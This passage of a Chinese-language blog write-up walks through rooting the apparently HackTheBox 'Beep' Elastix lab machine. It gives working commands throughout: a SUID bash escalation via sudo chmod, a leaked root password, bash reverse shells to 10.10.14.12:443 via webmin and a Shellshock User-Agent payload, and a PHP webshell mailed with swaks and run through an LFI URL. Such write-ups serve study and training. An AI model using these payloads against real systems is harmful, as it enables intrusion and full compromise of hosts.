+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.24.19.png" alt="截屏2022-07-05 15.24.19"><br>成功拿到对应的 flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /home/fanis/user.txt</span><br><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.26.14.png" alt="截屏2022-07-05 15.26.14"></p>
+<p>查看 sudo 的运行权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.20.28.png" alt="截屏2022-07-05 15.20.28"><br>其中存在多个命令不需要输入密码便可以 root 权限运行，包括<code>chmod</code>以及<code>chown</code>等修改文件权限的命令，我们可以使用 chmod 来修改<code>/bin/bash</code>的运行权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l /bin/bash</span><br><span class="line">sudo chmod 4755 /bin/bash</span><br><span class="line">ls -l /bin/bash</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.30.34.png" alt="截屏2022-07-05 15.30.34"></p>
+<p>现在只需要运行 bash 便可拿到 root 权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">id</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.31.17.png" alt="截屏2022-07-05 15.31.17"></p>
+<h3 id="webmin登录"><a href="#webmin登录" class="headerlink" title="webmin登录"></a>webmin登录</h3><p>通过本地文件包含成功拿到了目标的密码，通过<code>root/jEhdIekWmdjE</code>可成功登录 webadmin，该界面用于管理机器，并且具有完全 root 权限。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.36.48.png" alt="截屏2022-07-05 15.36.48"></p>
+<p>在其中以 root 权限创建任务执行反弹shell指令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.12/443 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.41.54.png" alt="截屏2022-07-05 15.41.54"></p>
+<p>过几分钟以后成功收到反弹shell<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.48.48.png" alt="截屏2022-07-05 15.48.48"></p>
+<h3 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h3><p>由于目标泄露了密码<code>jEhdIekWmdjE</code>，因此我也可以直接通过 ssh 登录目标靶机</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@10.10.10.7</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.46.44.png" alt="截屏2022-07-05 15.46.44"></p>
+<p>但目标回显未指定密钥交换方法，那么使用命令指定密钥交换方法再次连接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.47.27.png" alt="截屏2022-07-05 15.47.27"></p>
+<h3 id="Shellshock"><a href="#Shellshock" class="headerlink" title="Shellshock"></a>Shellshock</h3><p>假设目前我并没有密码，那么我肯定会尝试登录 webmin，当我尝试登录时，目标会创建一个 POST 请求<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.53.45.png" alt="截屏2022-07-05 15.53.45"></p>
+<p>任何时候只要存在 CGI，尤其是在旧机器上，我们就可以尝试使用 shellshock。将<code>User-agent</code>中的漏洞字符串修改为<code>() &#123; :; &#125;;[cmd]</code>，首先测试睡眠命令，比如<code>sleep 10</code>，结果目标等待10秒后才返回，说明存在 shellshock 漏洞<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2015.58.13.png" alt="截屏2022-07-05 15.58.13"></p>
+<p>在本地监听 icmp 数据包</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -ni tun0 icmp</span><br></pre></td></tr></table></figure>
+
+<p>在命令中执行 ping 指令，测试是否出网</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;;ping -c 1 10.10.14.12</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2016.14.15.png" alt="截屏2022-07-05 16.14.15"></p>
+<p>成功收到 icmp 响应<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2016.16.50.png" alt="截屏2022-07-05 16.16.50"></p>
+<p>尝试在命令中执行反弹shell命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;;bash -i &gt;&amp; /dev/tcp/10.10.14.12/443 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2016.19.47.png" alt="截屏2022-07-05 16.19.47"></p>
+<p>成功收到反弹shell<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2016.19.36.png" alt="截屏2022-07-05 16.19.36"></p>
+<h3 id="webshell上传"><a href="#webshell上传" class="headerlink" title="webshell上传"></a>webshell上传</h3><p>因为目标靶机存在本地文件包含漏洞，那么我只要在主机上放置一个 webshell，利用文件包含就可以实现权限获取，而上传文件则有多种方式</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、日志中毒</span><br><span class="line">2、会话存储</span><br><span class="line">3、电子邮件</span><br></pre></td></tr></table></figure>
+<p>前两种方式经过测试后都无法上传文件，而发送电子邮件是一个不错的方法，其绝对路径路径为<code>/var/mail/[username]</code>，通过 swaks 发送电子邮件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swaks --to asterisk@localhost --from mac@beep.htb --header &quot;Subject: test&quot; --body &#x27;check out this code: &lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;&#x27; --server 10.10.10.7</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2017.29.13.png" alt="截屏2022-07-05 17.29.13"></p>
+<p>利用文件包含漏洞读取文件，执行 id 命令成功回显</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/asterisk%00&amp;module=Accounts&amp;action&amp;cmd=id</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d21550b1/%E6%88%AA%E5%B1%8F2022-07-05%2017.32.41.png" alt="截屏2022-07-05 17.32.41"></p>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>Elastix 是靶机的主要突破点，通过 searchsploit 可以轻松找到该应用的历史漏洞，经过测试后发现目标存在本地文件包含以及远程代码执行漏洞。利用本地文件包含获取配置文件，成功拿到密码信息。通过远程代码执行漏洞拿到 esterisk 权限，在提权方面利用脚本建议通过 sudo 进入 nmap 的交互模式能够成功执行 root 权限命令，这时候提出思考：既然 sudo nmap 可以执行，那么其他命令是不是也可以通过 sudo 来无密码获取权限。结果当然是可行的，利用 chmod 修改 bash 权限即可轻松获取 root 权限。 </p>
+<p>其他获取管理员权限的方式还有很多，利用文件包含拿到的密码可以轻松登录 webmin 应用和 SSH 服务，且权限都是 root，在 webmin 中还因 CGI 接口发现了该应用存在 shellshock 漏洞，该漏洞通过 http 传输请求，因此也能直接获取 root 权限。最后一种方式则利用邮件服务，将带有木马的邮件发送至主机用户的邮箱中，通过文件包含执行命令，从而完成了 webshell 的基本操作。</p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/240eacf2/">数据库攻防之MySQL<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
